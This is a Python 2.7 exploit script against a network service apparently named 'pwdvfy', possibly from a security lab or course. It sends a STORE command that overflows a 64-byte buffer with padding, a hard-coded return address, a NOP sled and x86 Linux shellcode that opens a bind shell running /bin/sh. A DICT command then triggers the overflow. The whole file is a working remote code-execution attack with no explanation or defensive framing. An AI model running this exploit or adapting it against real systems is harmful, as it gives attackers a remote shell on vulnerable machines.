#!/usr/bin/python2.7

import sys, socket, time
from sys import exit

debug = False

TARGET_PORT =	11111
TIME =		str(time.time())

# PAD_COUNT must divide evenly by len(PAD_STR) !!
PAD_COUNT =	76
PAD_STR =	"\x41"
NOP_COUNT =	32

#changeUser()
#RETURN_ADDR =   "\x7c\x8c\x04\x08"

# Addr of injected shell code (somewhere in nop sled)
RETURN_ADDR = "\x48\xfd\xff\xbf"

SHELLCODE =     "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" + \
                "\x5b\x5e\x52\x68\x02\x39\x7a\x69\x6a\x10\x51\x50\x89\xe1\x6a" + \
                "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" + \
                "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" + \
                "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" + \
                "\x0b\xcd\x80"

# Connect to target and send msgs
def attack(ip, port, msgs):
    port = int(port)
    i = 1

    for msg in msgs:
        try:
	    print "Trying to connect..."
	    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    sock.connect((ip, port))
	    print "Success!"
        except:
	    print "Failed."
	    exit(1)
	try:
	    print   "Trying to send msg " + str(i) + \
		    " with length " + str(len(msg)) + "..."
	    sock.send(msg)
	    print "Sent."
	except:
	    print "Failed to send msg " + str(i)
	    try:
		sock.close()
	    except:
		exit(1)
	    exit(1)
        try:
	    sock.close()
        except:
	    exit(1)
	print ""
	if debug:
	    raw_input("Press ENTER to continue...")
	    print ""
	i += 1
   
def genMsgs():
    # Build the attack string to overflow the buffer (Size 64)
    buf = ""
    buf += PAD_STR * (PAD_COUNT / len(PAD_STR)) 
    buf += RETURN_ADDR
    buf += "\x90" * NOP_COUNT
    buf += SHELLCODE
    
    if debug:
    	print "Length of attack buf: " + str(len(buf))

    # STORE command in pwdvfy
    # Use system time in place of username so different each time
    store = "STORE " + TIME + " "
    store += buf
    store += "\n"
    
    # DICT command in pwdvfy
    dic = "DICT " + TIME
    dic += "\n"

    msgs = [store, dic]
    return msgs

def main():
    if len(sys.argv) < 2:
	exit()
    ip = sys.argv[1]
    if len(sys.argv) > 2:
        port = sys.argv[2]
    else:
        port = TARGET_PORT
    
    msgs = genMsgs()
    attack(ip, port, msgs)

if __name__ == "__main__":
    main()  
